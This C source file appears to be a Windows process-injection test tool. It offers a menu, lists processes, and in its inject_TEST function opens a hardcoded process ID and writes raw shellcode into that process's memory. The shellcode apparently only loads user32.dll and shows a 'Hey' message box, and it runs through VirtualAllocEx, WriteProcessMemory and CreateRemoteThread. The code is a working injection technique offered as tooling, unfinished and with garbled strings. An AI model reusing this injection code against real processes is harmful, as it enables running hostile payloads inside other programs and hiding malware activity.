#define _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_DEPRECATE  
#define _CRT_NONSTDC_NO_DEPRECATE

#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>

#include "proc.h"

BOOL procList(void);
int input(void);
void inject_TEST(void);

int main() {
    while (TRUE) {
        int choice, num;
        printf("\033[31mProcess Injecetion Automation Test Tool\033[0m\n");
        printf("\033[31mBy: Matuesz Peplinski\033[0m\n");
        printf("[1]Begin Injection\n");
        printf("[2]Test Injection\n");
        printf("[3]List Processes\n");
        printf("\033[36mEnter your choice:\033[0m\n");
        choice = input();

        switch (choice) {
        case 1: {

            break;
        }
        case 2: {
            printf("The call to test function will be made\n");
            printf("This function will inject codeFINSIHSHSHSHSHSHH\n");
            inject_TEST();
            break;
        }
        case 3: {
            procList();
            system("cls");
            procList();
            break;
        }
        default:
            printf("wrong Input\n");

        }

    }
    
    
	return 0;
}
int input()
{
    int number;
    printf("\033[36m>");
    scanf_s("%d", &number);
    return (number);
}

#define procID 555

void inject_TEST(void) {
    char shellCode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb\x61\xd9"\
                       "\xe7\x77\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x32"\
                       "\xb3\xe7\x77\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x03\x31\xd2\x52\x51"\
                       "\x51\x52\xff\xd0\x31\xd2\x50\xb8\xfd\x98\xe7\x77\xff\xd0\xe8\xc4\xff"\
                       "\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"\
                       "\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"\
                       "\xff\x48\x65\x79\x4e";


    HANDLE hProcess; // Handle to store remote process handle
    HANDLE hThread;
    void* exec_mem;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, procID);
    exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, shellCode, sizeof(shellCode), NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);

    //CloseHandle(hProcess);
}